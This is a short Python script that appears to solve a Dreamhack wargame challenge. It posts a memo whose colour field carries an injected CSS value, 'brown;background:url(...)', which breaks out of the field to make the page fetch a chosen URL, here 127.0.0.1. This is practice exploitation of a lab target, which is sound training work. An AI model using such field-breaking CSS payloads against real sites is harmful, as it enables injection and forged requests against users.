import requests

BASE_URL = "http://host3.dreamhack.games:13535/"

payload = "?path=write"

my_host = "http://127.0.0.1/"

css = f"brown;background:url({my_host})"

data = {"memoTitle":"kimgoon", "memoColor":css, "memoContent":"GimGoon"}

res = requests.post(BASE_URL + payload, data=data)

print(res.text)
